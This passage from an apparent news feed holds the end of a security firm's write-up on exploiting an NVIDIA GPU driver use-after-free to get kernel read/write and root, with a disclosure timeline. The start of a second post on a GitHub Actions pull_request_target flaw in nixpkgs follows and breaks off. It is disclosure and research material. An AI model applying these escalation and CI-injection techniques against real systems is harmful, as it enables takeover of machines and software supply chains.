<p>The first step in the exploitation is to gain control of the UAF. The goal is to trigger it, provoke a large number of purges so that the affected kernel stack is actually freed and finally allocate a v4l2 buffer that overlaps the UAF address. By memory mapping (via <code>mmap</code>) this buffer, we can get full control over the UAF area. First, we begin by allocating deviceless memory in the NVIDIA driver until there is no unpurged area left and the pools are empty. Then, we can use the forking primitive to fill all the holes in the <code>vmalloc</code> area. This will ensure a clean state where future allocations will be made one right after the other even if they are of different sizes. When forking, we will make most of the processes terminate immediately. However, some of them will be kept alive at regular intervals, to create gaps that are smaller than the v4l2 buffers we will allocate later. This way, even after the unpurged stacks are freed (red allocations in the next figure), any v4l2 buffer allocated will end up in the clean area, while smaller allocations on the system that could disrupt the exploitation will end up in these holes. We will refer to the kept alive stacks as guards.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-6.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-6.png" width="100%">
</a></p>
<p>Once we reach the clean state, we do the final setup by:</p>
<ol>
<li>Forking and keeping alive a "beacon" process (used later)</li>
<li>Allocating and freeing a medium-sized v4l2 buffer</li>
<li>Forking a new process and triggering bug #1 with it</li>
<li>Allocating and freeing a medium-sized v4l2 buffer again</li>
<li>Allocating and keeping alive a final guard process</li>
</ol>
<p>These steps are very time sensitive as any other allocation on the system may get in between, most probably leading to a failure of the exploitation. </p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-7.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-7.png" width="100%">
</a></p>
<p>After that, it's possible to monitor the oops happening by waiting for the triggering process to get killed. Once it happened, the driver will be in a reduced state. Indeed, the kernel thread that hit the bug was killed while holding locks, so, most new calls to the drivers will just hang indefinitely. This means we can't use the side effect purge method and instead have to use large v4l2 buffers. These large allocations will not interfere with the area of the UAF as they will be allocated further away because of the guard stacks.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-8.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-8.png" width="100%">
</a></p>
<p>Once we allocated and freed enough of these large allocations so that the pools are empty, we can just allocate a set of two medium-sized v4l2 buffers. These buffers will be backed by only one <code>vmalloc</code> allocation and so they will be one after the other. If everything went right, they should end up being allocated just after the beacon process because of guards. The second buffer will contain the UAF. The reason we used two buffers is because Buffer0 will be used later in the exploitation for data storage.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-9.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-9.png" width="100%">
</a></p>
<h2 id="the tree data structure">The tree data structure</h2>
<p>The UAF we now control somewhere in Buffer1 is the node of a <a href="https://en.wikipedia.org/wiki/Red%E2%80%93black_tree">binary Red/Black tree</a>. It serves as the underlying data storage for a map container, the global <code>threadStateDatabase.dbRoot</code>. This map is used to store structures of type <code>THREAD_STATE_NODE</code> in the time frame between <code>threadStateInit()</code> and <code>threadStateFree()</code>. The implementation is intrusive so every <code>THREAD_STATE_NODE</code> structure contains a <code>struct MapNode</code> defined as follows:</p>
<div><pre><span></span><code><span>// src/nvidia/inc/libraries/containers/map.h</span>

<span>struct</span><span> </span><span>MapNode</span><span> </span><span>{</span>
<span>    </span><span>NvU64</span><span>       </span><span>key</span><span>;</span>
<span>    </span><span>MapNode</span><span>    </span><span>*</span><span>pParent</span><span>;</span>
<span>    </span><span>MapNode</span><span>    </span><span>*</span><span>pLeft</span><span>;</span>
<span>    </span><span>MapNode</span><span>    </span><span>*</span><span>pRight</span><span>;</span>
<span>    </span><span>NvBool</span><span>      </span><span>bIsRed</span><span>;</span>
<span>};</span>
</code></pre></div>
<p>This data structure will be our primary focus. The <code>THREAD_STATE_NODE</code> structure also contains interesting fields such as function pointers. However, the <code>threadStateInit()</code> and <code>threadStateFree()</code> functions only perform operations on the structure found in their own stack, so that it' not possible to trick them into calling these function pointers on a node coming from the tree.</p>
<h2 id="revealing kernel memory addresses">Revealing kernel memory addresses</h2>
<p>Even if the driver is in a reduced state, one operation still working is opening a GPU device (e.g. <code>/dev/nvidia0</code>). Fortunately, this triggers a call to <code>rm_is_device_sequestered()</code> which uses the <code>threadStateInit()</code> and <code>threadStateFree()</code> combo. This means a new node will be inserted and removed from the tree each time we open the device file. As the nodes have a very short life span, we can expect the UAF node to be the only one in the tree. As such, the UAF node will be the root and we can expand the tree by creating our own node linked to it. Before doing that, we need to solve two problems:</p>
<ul>
<li>Where is the UAF node located in Buffer1 to be able to modify it </li>
<li>What is the address of Buffer0 so we can create our own nodes inside it and link them together</li>
</ul>
<p>Because of <code>random_kstack_offset</code>, we can't predict the offset of the UAF node in the stack and so its offset in Buffer1. Fortunately, a zeroed out <code>struct MapNode</code> is a valid node (a black node with no children). Therefore, if the whole Buffer1 is zeroed out, insertions in the tree can happen without any issue. Because the key will also be 0, new nodes will be inserted as the right child of the UAF node. So, when calling <code>open</code> on the GPU device, <code>node.pRight</code> will very briefly be filled with a pointer to a child. To find the offset of the node in Buffer1, a possibility is to call <code>open</code> repeatedly from another process and scan Buffer1 until we find a non-zero value.</p>
<p>Furthermore, because <code>node.pRight</code> will point to the <code>struct MapNode</code> stored in the stack of the process calling <code>open</code>, it's effectively leaking an address inside its kernel stack. We set up a beacon process for this reason, ensuring its stack is positioned just before Buffer0.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-10.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-10.png" width="100%">
</a></p>
<p>Once the beacon stack address is leaked, we can guess an address that should be part of Buffer0. If we set <code>node.pRight</code> of the UAF node to this guessed address, new nodes will be inserted as the right child of the guessed node. By calling <code>open</code> repeatedly again and scanning Buffer0 for a nonzero value, we can find the offset of the guessed node. By subtracting the found offset to the guess address we ultimately find the exact kernel address of Buffer0.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-11.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/vmalloc-11.png" width="100%">
</a></p>
<p>The guess address technique may seem superfluous, but it's essential as we cannot ascertain the exact beacon stack base address from the leak. This ambiguity is due to the <code>random_kstack_offset</code> feature and the possibility that a kernel stack allocation can begin at any page boundary.</p>
<h2 id="a first write primitive">A first write primitive</h2>
<p>Now that we have everything needed to create arbitrary trees, we need to find arrangements that could lead to interesting primitives during either insertion or deletion of a node. These operations always comprise the actual addition or removal of the node in the tree followed by a fixup phase (<code>_mapInsertFixup()</code> or <code>_mapDeleteFixup()</code>). These fixup functions will usually recolor and perform rotations in the tree. They are interesting as they loop up through it allowing us to have at least a bit of control on the execution. The goal is then to trick them into reading or writing at an arbitrary address. To do so we can use part of the rotation code:</p>
<div><pre><span></span><code><span>static</span><span> </span><span>void</span><span> </span><span>_mapRotateRight</span>
<span>(</span>
<span>    </span><span>MapNode</span><span> </span><span>**</span><span>pPRoot</span><span>,</span>
<span>    </span><span>MapNode</span><span> </span><span>*</span><span>x</span>
<span>)</span>
<span>{</span>
<span>    </span><span>// rotate node x to right</span>
<span>    </span><span>MapNode</span><span> </span><span>*</span><span>y</span><span> </span><span>=</span><span> </span><span>x</span><span>-&gt;</span><span>pLeft</span><span>;</span>
<span>    </span><span>// establish x-&gt;pLeft link</span>
<span>    </span><span>x</span><span>-&gt;</span><span>pLeft</span><span> </span><span>=</span><span> </span><span>y</span><span>-&gt;</span><span>pRight</span><span>;</span>

<span>    </span><span>if</span><span> </span><span>(</span><span>y</span><span>-&gt;</span><span>pRight</span><span>)</span>
<span>        </span><span>y</span><span>-&gt;</span><span>pRight</span><span>-&gt;</span><span>pParent</span><span> </span><span>=</span><span> </span><span>x</span><span>;</span><span> </span><span>// &lt;= Here is the only use of y-&gt;pRight</span>

<span>    </span><span>// establish y-&gt;pParent link</span>
<span>    </span><span>y</span><span>-&gt;</span><span>pParent</span><span> </span><span>=</span><span> </span><span>x</span><span>-&gt;</span><span>pParent</span><span>;</span>

<span>    </span><span>if</span><span> </span><span>(</span><span>x</span><span>-&gt;</span><span>pParent</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>if</span><span> </span><span>(</span><span>x</span><span> </span><span>==</span><span> </span><span>x</span><span>-&gt;</span><span>pParent</span><span>-&gt;</span><span>pRight</span><span>)</span>
<span>            </span><span>x</span><span>-&gt;</span><span>pParent</span><span>-&gt;</span><span>pRight</span><span> </span><span>=</span><span> </span><span>y</span><span>;</span>
<span>        </span><span>else</span>
<span>            </span><span>x</span><span>-&gt;</span><span>pParent</span><span>-&gt;</span><span>pLeft</span><span> </span><span>=</span><span> </span><span>y</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>else</span>
<span>        </span><span>(</span><span>*</span><span>pPRoot</span><span>)</span><span> </span><span>=</span><span> </span><span>y</span><span>;</span>

<span>    </span><span>// link x and y</span>
<span>    </span><span>y</span><span>-&gt;</span><span>pRight</span><span> </span><span>=</span><span> </span><span>x</span><span>;</span>
<span>    </span><span>x</span><span>-&gt;</span><span>pParent</span><span> </span><span>=</span><span> </span><span>y</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>There is a mirror version of this code (<code>_mapRotateLeft</code>) that could also be used, but we will focus on the right one. When executed this function will set <code>pParent</code> in the node pointed to by <code>y-&gt;pRight</code> if it's not null without ever using it again. Visually the rotation looks like this:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-1.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-1.png" width="55%">
</a></p>
<p>If we set <code>y-&gt;pRight</code> to an arbitrary address, we can obtain a constrained arbitrary write primitive because a pointer to <code>x</code> will be written to <code>y-&gt;pRight + offsetof(MapNode, pParent)</code>.</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-2.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-2.png" width="55%">
</a></p>
<p>Assuming <code>x</code> is one of our nodes in Buffer0, we can consider that we are writing a pointer to a controlled address. The right rotation can be attained from <code>_mapInsertFixup()</code> without the value of <code>y-&gt;pRight</code> being used by building the right tree structure. There might be better primitives available directly from the tree but this one have the advantage of being straightforward and reliable.</p>
<h2 id="selecting a target">Selecting a target</h2>
<p>Next step is to find what exactly to overwrite. Without relying on other bugs, we are only aware of a few addresses allocated by <code>vmalloc</code>. One solution would be to shape the <code>vmalloc</code> area so that an interesting allocation is found close to our beacon and buffers in order to guess its address. That should be doable, but after searching for a bit, I didn't find any interesting structure. As a matter of fact, <code>vmalloc</code> is not used that much in the kernel and mostly for big buffers because of its page granularity. Also, there are in fact multiple separated <code>vmalloc</code> areas, limiting the possibilities.</p>
<p>Instead, targeting kernel stacks seemed easier as we already know we can leak their addresses. We used this capability before to guess the address of Buffer0. However, we can also leak the address of other interesting values in the stack during the execution of <code>open</code> (the syscall that triggers the insertion in the tree). Indeed, offsets in the stack should be constant for a given kernel and driver binaries, we can just calculate beforehand the distance between the node and a specific value we want to target in the stack. The use of <code>kstack_random_offset</code> changes nothing, as the offset is added before the syscall is executed.</p>
<p>However, in order to use this method combined with the write primitive, the target address needs to be computed in the very small time frame between the insertion of the node and the rotation of the tree that will trigger the write. This is due to the address changing every syscall because of <code>kstack_random_offset</code>. By default, there is not enough time for the userland process to modify the mapped memory in time. However, we can artificially increase the time taken by the tree iteration before the rotation is executed. The <code>_mapInsertFixup()</code> function has a recolor-only path which will perform the following:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-3.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-3.png" width="55%">
</a></p>
<p>For our purposes, recoloring has no side effects and can be used to waste time, by building a tree using the pattern found in the previous figure. We can then build a three-staged tree:</p>
<ul>
<li>Setup: Welcomes the new node insertion and make the iteration jump into an alternate part of the tree (i.e. that is not under the root) using a flawed <code>pParent</code> pointer</li>
<li>Dummy: Combination of an arbitrary number of recolor patterns used to waste time (256 patterns were used for the proof of concept)</li>
<li>Write: Perform a write using a rotation, the address will be computed and filled in dynamically by userland</li>
</ul>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-4.png">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/tree-4.png" width="80%">
</a></p>
<p>The node is made to be inserted as a left child using very large keys to facilitate the jump into the dummy phase. This tree allows to reliably write a pointer to controlled data over any chosen value in the kernel thread stack during the handling of the <code>open</code> syscall. The written data will effectively be a pointer to the node labeled <code>END</code>. After the rotation, we are free to write any data at this address.</p>
<h2 id="escalating with stack corruption">Escalating with stack corruption</h2>
<p>Now, we just need to find a good candidate pointer to overwrite. A very interesting one is the <code>file</code> pointer in <code>path_openat()</code>:</p>
<div><pre><span></span><code><span>// fs/namei.c</span>

<span>static</span><span> </span><span>struct</span><span> </span><span>file</span><span> </span><span>*</span><span>path_openat</span><span>(</span><span>struct</span><span> </span><span>nameidata</span><span> </span><span>*</span><span>nd</span><span>,</span>
<span>            </span><span>const</span><span> </span><span>struct</span><span> </span><span>open_flags</span><span> </span><span>*</span><span>op</span><span>,</span><span> </span><span>unsigned</span><span> </span><span>flags</span><span>)</span>
<span>{</span>
<span>    </span><span>struct</span><span> </span><span>file</span><span> </span><span>*</span><span>file</span><span>;</span>
<span>    </span><span>int</span><span> </span><span>error</span><span>;</span>

<span>    </span><span>file</span><span> </span><span>=</span><span> </span><span>alloc_empty_file</span><span>(</span><span>op</span><span>-&gt;</span><span>open_flag</span><span>,</span><span> </span><span>current_cred</span><span>());</span><span> </span><span>// struct file allocation</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>IS_ERR</span><span>(</span><span>file</span><span>))</span>
<span>        </span><span>return</span><span> </span><span>file</span><span>;</span>

<span>    </span><span>if</span><span> </span><span>(</span><span>unlikely</span><span>(</span><span>file</span><span>-&gt;</span><span>f_flags</span><span> </span><span>&amp;</span><span> </span><span>__O_TMPFILE</span><span>))</span><span> </span><span>{</span>
<span>        </span><span>error</span><span> </span><span>=</span><span> </span><span>do_tmpfile</span><span>(</span><span>nd</span><span>,</span><span> </span><span>flags</span><span>,</span><span> </span><span>op</span><span>,</span><span> </span><span>file</span><span>);</span>
<span>    </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>unlikely</span><span>(</span><span>file</span><span>-&gt;</span><span>f_flags</span><span> </span><span>&amp;</span><span> </span><span>O_PATH</span><span>))</span><span> </span><span>{</span>
<span>        </span><span>error</span><span> </span><span>=</span><span> </span><span>do_o_path</span><span>(</span><span>nd</span><span>,</span><span> </span><span>flags</span><span>,</span><span> </span><span>file</span><span>);</span>
<span>    </span><span>}</span><span> </span><span>else</span><span> </span><span>{</span>
<span>        </span><span>const</span><span> </span><span>char</span><span> </span><span>*</span><span>s</span><span> </span><span>=</span><span> </span><span>path_init</span><span>(</span><span>nd</span><span>,</span><span> </span><span>flags</span><span>);</span>
<span>        </span><span>while</span><span> </span><span>(</span><span>!</span><span>(</span><span>error</span><span> </span><span>=</span><span> </span><span>link_path_walk</span><span>(</span><span>s</span><span>,</span><span> </span><span>nd</span><span>))</span><span> </span><span>&amp;&amp;</span>
<span>               </span><span>(</span><span>s</span><span> </span><span>=</span><span> </span><span>open_last_lookups</span><span>(</span><span>nd</span><span>,</span><span> </span><span>file</span><span>,</span><span> </span><span>op</span><span>))</span><span> </span><span>!=</span><span> </span><span>NULL</span><span>)</span>
<span>            </span><span>;</span>
<span>        </span><span>if</span><span> </span><span>(</span><span>!</span><span>error</span><span>)</span>
<span>            </span><span>error</span><span> </span><span>=</span><span> </span><span>do_open</span><span>(</span><span>nd</span><span>,</span><span> </span><span>file</span><span>,</span><span> </span><span>op</span><span>);</span><span> </span><span>// function that will lead to the write</span>
<span>        </span><span>terminate_walk</span><span>(</span><span>nd</span><span>);</span>
<span>    </span><span>}</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>likely</span><span>(</span><span>!</span><span>error</span><span>))</span><span> </span><span>{</span>
<span>        </span><span>if</span><span> </span><span>(</span><span>likely</span><span>(</span><span>file</span><span>-&gt;</span><span>f_mode</span><span> </span><span>&amp;</span><span> </span><span>FMODE_OPENED</span><span>))</span>
<span>            </span><span>return</span><span> </span><span>file</span><span>;</span>
<span>        </span><span>WARN_ON</span><span>(</span><span>1</span><span>);</span>
<span>        </span><span>error</span><span> </span><span>=</span><span> </span><span>-</span><span>EINVAL</span><span>;</span>
<span>    </span><span>}</span>
<span>    </span><span>fput_close</span><span>(</span><span>file</span><span>);</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>error</span><span> </span><span>==</span><span> </span><span>-</span><span>EOPENSTALE</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>if</span><span> </span><span>(</span><span>flags</span><span> </span><span>&amp;</span><span> </span><span>LOOKUP_RCU</span><span>)</span>
<span>            </span><span>error</span><span> </span><span>=</span><span> </span><span>-</span><span>ECHILD</span><span>;</span>
<span>        </span><span>else</span>
<span>            </span><span>error</span><span> </span><span>=</span><span> </span><span>-</span><span>ESTALE</span><span>;</span>
<span>    </span><span>}</span>
<span>    </span><span>return</span><span> </span><span>ERR_PTR</span><span>(</span><span>error</span><span>);</span>
<span>}</span>
</code></pre></div>
<p>When looking at the compiled binary for the target version, we can see that the <code>file</code> pointer is stored in <code>r12</code>. The <code>do_open()</code> function spills <code>r12</code> on the stack and at the same time will lead to the call that triggers our write. Meaning that we can ultimately overwrite the <code>file</code> pointer to make it point into our memory mapped Buffer0 by precomputing the offset between <code>struct MapNode</code> and the spilled <code>r12</code> register in the stack. This modified file pointer will be returned by <code>path_openat()</code> and associated with a file descriptor in the calling process by <code>fd_install()</code> in <code>do_sys_openat2()</code>. There are a few checks and dereferences that may cause issues, but by creating a fake <code>struct file</code> with somewhat sensible values it's possible to overcome them easily.</p>
<p>It's to be noted that the <code>file</code> structure is defined with the <code>__randomize_layout</code> macro. This will lead to the fields being out of order and that we have to find the offsets for the specific target kernel. Fortunately, in our case, these can be easily extracted from the Ubuntu debug packages.</p>
<h2 id="leaking kaslr">Leaking KASLR</h2>
<p>The control over a <code>struct file</code> is extremely powerful. This structure notably contains several function pointers due to the Virtual File System layer. However, our last barrier to a full exploitation is KASLR (Kernel Address Space Layout Randomization). To break it, we can leverage some syscalls that check the type of a file by comparing the <code>f_op</code> pointer to the expected <code>struct file_operations</code>. For example, <code>recvfrom</code> uses <code>sock_from_file()</code> to get access to private data specific to sockets and checks the file type using the <code>f_op</code> pointer:</p>
<div><pre><span></span><code><span>// linux/net/socket.c</span>

<span>struct</span><span> </span><span>socket</span><span> </span><span>*</span><span>sock_from_file</span><span>(</span><span>struct</span><span> </span><span>file</span><span> </span><span>*</span><span>file</span><span>)</span>
<span>{</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>likely</span><span>(</span><span>file</span><span>-&gt;</span><span>f_op</span><span> </span><span>==</span><span> </span><span>&amp;</span><span>socket_file_ops</span><span>))</span>
<span>        </span><span>return</span><span> </span><span>file</span><span>-&gt;</span><span>private_data</span><span>;</span><span>  </span><span>/* set in sock_alloc_file */</span>

<span>    </span><span>return</span><span> </span><span>NULL</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>If the pointers don't match and <code>sock_from_file()</code> returns null, <code>recvfrom</code> will simply return <code>-ENOTSOCK</code>. So, we can call this syscall repeatedly on the file descriptor linked with our controlled <code>struct file</code>, starting with <code>f_op</code> set to the static address of <code>socket_file_ops</code> and then incrementing it to test all the possible slided values. KASLR is leaked when the syscall returns something other than <code>-ENOTSOCK</code>. This is a somewhat fast process due to KASLR entropy only being 9 bits.</p>
<h2 id="wrapping up">Wrapping up</h2>
<p>After that, we can just create our own file operations table. I decided to use the <code>llseek</code> handler to perform arbitrary functions calls in the kernel. It's defined as follows:</p>
<div><pre><span></span><code><span>loff_t</span><span> </span><span>(</span><span>*</span><span>llseek</span><span>)</span><span> </span><span>(</span><span>struct</span><span> </span><span>file</span><span> </span><span>*</span><span> </span><span>file</span><span>,</span><span> </span><span>loff_t</span><span> </span><span>offset</span><span>,</span><span> </span><span>int</span><span> </span><span>whence</span><span>);</span>
</code></pre></div>
<p>It's interesting because the syscall handler does not perform any check on the file before calling the handler. Also, we have control and access to all the parameters and the return value directly from userland. The limitations are as follows:</p>
<ul>
<li>The <code>whence</code> parameter should be less than five</li>
<li>The first parameter is a pointer to our controlled <code>struct file</code> meaning we must input or output arbitrary data from the start of the structure. That's not a problem on the target version because all the fields in the start are unused, but it could be if we are very unlucky with the randomized order of the fields.</li>
</ul>
<p>By setting the handler to point to selected kernel functions and then calling the <code>llseek</code> syscall, we can build a basic set of primitives:</p>
<ul>
<li>Kernel symbolication with <code>unsigned long kallsyms_lookup_name(const char *name)</code></li>
<li>Kernel arbitrary read with <code>void *memcpy(void *dest, const void *src, size_t count)</code></li>
<li>Kernel arbitrary write with <code>int debugfs_u64_get(void *data, u64 *val)</code></li>
</ul>
<p>For testing them, we can escalate the privileges of our userland process. We just need to symbolicate <code>init_task</code> and iterate the tasks until we find the one corresponding to our process. Then, we can overwrite the creds to become root and open a shell. Below is the full proof of concept running in real time:</p>
<p><a href="https://blog.quarkslab.com/resources/2025-10-14_oops/demo.gif">
<img height="100%" src="https://blog.quarkslab.com/resources/2025-10-14_oops/demo.gif" width="75%">
</a></p>

<p>To conclude, a couple of key points to consider. First, the exploit is sensitive to system activity, particularly forking and calls to the NVIDIA driver during specific time frames. This poses a challenge on systems under constant heavy load where the exploitation will most likely fail.</p>
<p>Second, as previously mentioned the kernel oops triggered by bug #1 causes multiple locks to be held, rendering most of the NVIDIA driver unusable. It should be possible to manually unlock the driver using the kernel read and write primitives, but this has not been tested.</p>
<p>The complete proof-of-concept exploit described in this blog post is available <a href="https://blog.quarkslab.com/resources/2025-10-14_oops/nvidia-open-gpu-cve-2025-23330-poc.tgz">here</a></p>
<h2 id="disclosure timeline">Disclosure timeline</h2>
<p>Below we include a timeline of all the relevant events during the coordinated vulnerability disclosure process with the intent of providing transparency to the whole process and our actions.</p>
<ul>
<li><strong>2025-06-18</strong> Quarkslab reported the vulnerabilities to NVIDIA PSIRT.</li>
<li><strong>2025-06-18</strong> NVIDIA acknowledged the report and asked if we planned to disclose the bugs.</li>
<li><strong>2025-06-25</strong> Quarkslab replied that we planned to publish a blog post or conference talk but there was no specific plan and it would be determined along the coordination process.</li>
<li><strong>2025-06-26</strong> NVIDIA acknowledged last email and promised to keep us updated as the process evolves.</li>
<li><strong>2025-07-14</strong> NVIDIA indicated it couldnt reproduce the bugs.</li>
<li><strong>2025-07-21</strong> Quarkslab sent a reply to NVIDIA noting that the report had specific comments about triggering the bugs and exploitability.</li>
<li><strong>2025-07-22</strong> NVIDIA acknowledged the last communication and said it was passed to the dev team.</li>
<li><strong>2025-07-24</strong> Quarkslab sent further details about how to reproduce the bugs and asked what runtime environment was NVIDIA using to try to repro them.</li>
<li><strong>2025-07-28</strong> Quarkslab re-sent the prior email with a minimized PoC.</li>
<li><strong>2025-08-08</strong> NVIDIA provided information about their runtime environment, the internal case numbers, and said they will implement the fixes by mid-january 2026, and asked if Quarkslab could delay disclosure until then.</li>
<li><strong>2025-08-11</strong> NVIDIA reiterated the request to postpone disclosure until mid-January 2026.</li>
<li><strong>2025-08-12</strong> Quarkslab replied that the bugs were first reported in June 18th and mid-January was well past the standard 90 day normally agreed for coordinated disclosure and that we did not see a rationale for postponing publication by, at a minimum, 3 months. Therefore Quarkslab continued with the publication deadline set to September 23rd 2025 and offered to extend the deadline an additional 30 days provided NVIDIA gave us some insights about the full scope of affected products and if the fixes are to be released as a stand alone security fix, as opposed to rolled into a version bump that includes other code changes.</li>
<li><strong>2025-08-12</strong> NVIDIA acknowledged our email and said it will communicate the deadline to the product team.</li>
<li><strong>2025-08-14</strong> NVIDIA provided an update and requested the 30-day extension offered. Indicated the fix for the null pointer dereferrence bug, which would make the UAF not reachable, was under review. The team was determining whether the fix would be a standalone update or included in a regular version update release. NVIDIA said it would be happy to share the final disclosure security bulletin language before releasing it to partners and the public.</li>
<li><strong>2025-08-18</strong> NVIDIA requested confirmation of the 30 day extension to the disclosure deadline.</li>
<li><strong>2025-08-18</strong> Quarkslab agreed to extend the disclosure deadline to October 23rd 2025.</li>
<li><strong>2025-10-09</strong> NVIDIA published <a href="https://nvidia.custhelp.com/app/answers/detail/a_id/5703">Security Bulletin: NVIDIA GPU Display Drivers - October 2025</a> crediting CVE-2025-2330 to Quarkslab.</li>
<li><strong>2025-10-09</strong> Quarkslab asked NVIDIA when they planned to fix the UAF bug or if it was the fix for CVE-2025-23280 in the October update, which was not credited to anyone.</li>
<li><strong>2025-10-09</strong> NVIDIA apologized for not having notified Quarkslab of the security bulletin release and said it would correct the attribution of CVE-2025-23280, which was indeed the Kernel UAF bug.</li>
<li><strong>2025-10-14</strong> This blog post is published.</li>
</ul>
            </div><p>If you would like to learn more about our security audits and explore how we can help you, <a href="https://content.quarkslab.com/talk-to-our-experts-blog">get in touch with us</a>!</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pwning the Entire Nix Ecosystem (248 pts)]]></title>
            <link>https://ptrpa.ws/nixpkgs-actions-abuse</link>
            <guid>45592401</guid>
            <pubDate>Wed, 15 Oct 2025 13:41:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ptrpa.ws/nixpkgs-actions-abuse">https://ptrpa.ws/nixpkgs-actions-abuse</a>, See on <a href="https://news.ycombinator.com/item?id=45592401">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><time datetime="2025-09-11T00:00:00+02:00">Sep 11, 2025 - 5 ' read</time><span> <a href="https://ptrpa.ws/tag/nixpkgs">nixpkgs</a>, <a href="https://ptrpa.ws/tag/nix">nix</a>, <a href="https://ptrpa.ws/tag/github-actions">github-actions</a>, <a href="https://ptrpa.ws/tag/vulnerability">vulnerability</a></span><p>last year at nixcon, me and <a href="https://mastodon.catgirl.cloud/@49016">my friend lexi</a> gave <a href="https://ptrpa.ws/youtube.com/live/_7wqXN-7ebw?t=38450s">a lightning talk</a> about how we found a vulnerability in nixpkgs that would have allowed us to pwn pretty much the entire nix ecosystem and inject malicious code into nixpkgs. it only took us about a day from starting our search to reporting it and getting it fixed. since i unfortunately was too sick to attend this years nixcon, i thought it might be a good time to write up what we found and how we did it.</p><h2 id="github-actions-the-easy-target"> github actions: the easy target <a href="#github-actions-the-easy-target">#</a></h2><p>github actions is a ci/cd system by github that can do pretty much anything in a repo. it’s an easy target for attackers because if you have access to a workflow, you can just commit code without authorization and then you have a supply chain attack. plus, it’s all written in yaml <a href="https://ruudvanasseldonk.com/2023/01/11/the-yaml-document-from-hell">🇳🇴</a>, which was NEVER meant to be executed !!</p><div><pre><code><span>name</span><span>:</span> <span>learn-github-actions</span>
<span>on</span><span>:</span> <span>[</span><span>push</span><span>]</span>
<span>jobs</span><span>:</span>
  <span>check-bats-version</span><span>:</span>
    <span>runs-on</span><span>:</span> <span>ubuntu-latest</span>
    <span>steps</span><span>:</span>
      <span>-</span> <span>uses</span><span>:</span> <span>actions/checkout@v4</span>
      <span>-</span> <span>uses</span><span>:</span> <span>actions/setup-node@v4</span>
      <span>-</span> <span>run</span><span>:</span> <span>npm install -g bats</span>
      <span>-</span> <span>run</span><span>:</span> <span>bats -v</span>
</code></pre></div><p>this is a simple example of a github action. nothing fancy, just running some commands when code is pushed.</p><h2 id="the-dangerous-pull_request_target"> the dangerous pull_request_target <a href="#the-dangerous-pull_request_target">#</a></h2><p>actions run when a trigger activates them. there are a bunch of different triggers like pushes, commits, or pull requests. but there’s a special one called <code>pull_request_target</code> that has a few critical differences from regular <code>pull_request</code>.</p><p>crucially, unlike <code>pull_request</code>, <code>pull_request_target</code> has read/write and secret access by default, even on pull requests from forks. this isn’t vulnerable by itself, but things go south when you start trusting user input from those PRs.</p><p>github even warns about this in their docs:</p><blockquote><p>Warning: For workflows that are triggered by the <code>pull_request_target</code> event, the <code>GITHUB_TOKEN</code> is granted read/write repository permission unless the <code>permissions</code> key is specified and the workflow can access secrets, even when it is triggered from a fork.</p></blockquote><p>so we started looking for workflows in nixpkgs that use <code>pull_request_target</code> and found 14 files. some of them were secure, like this labeler example:</p><div><pre><code><span>name</span><span>:</span> <span>"</span><span>Label</span><span> </span><span>PR"</span>
<span>on</span><span>:</span>
  <span>pull_request_target</span><span>:</span>
<span>jobs</span><span>:</span>
  <span>labels</span><span>:</span>
    <span>runs-on</span><span>:</span> <span>ubuntu-latest</span>
    <span>steps</span><span>:</span>
      <span>-</span> <span>uses</span><span>:</span> <span>actions/labeler@8558fd74291d67161a8a</span>
        <span>with</span><span>:</span>
          <span>repo-token</span><span>:</span> <span>$</span>
</code></pre></div><p>this is safe because it just passes the token to a trusted action. but then we found some more interesting ones…</p><h2 id="the-editorconfig-vulnerability"> the editorconfig vulnerability <a href="#the-editorconfig-vulnerability">#</a></h2><p>the first vulnerable workflow we found was for checking editorconfig rules. here’s a simplified version of what it was doing:</p><div><pre><code><span>steps</span><span>:</span>
  <span>-</span> <span>name</span><span>:</span> <span>Get list of changed files from PR</span>
    <span>run</span><span>:</span> <span>gh api [...] | jq [ ... ] &gt; "$HOME/changed_files"</span>
  <span>-</span> <span>uses</span><span>:</span> <span>actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871</span>
    <span>with</span><span>:</span>
      <span>ref</span><span>:</span> <span>refs/pull/$/merge</span>
  <span>-</span> <span>name</span><span>:</span> <span>Checking EditorConfig</span>
    <span>run</span><span>:</span> <span>cat "$HOME/changed_files" | xargs -r editorconfig-checker</span>
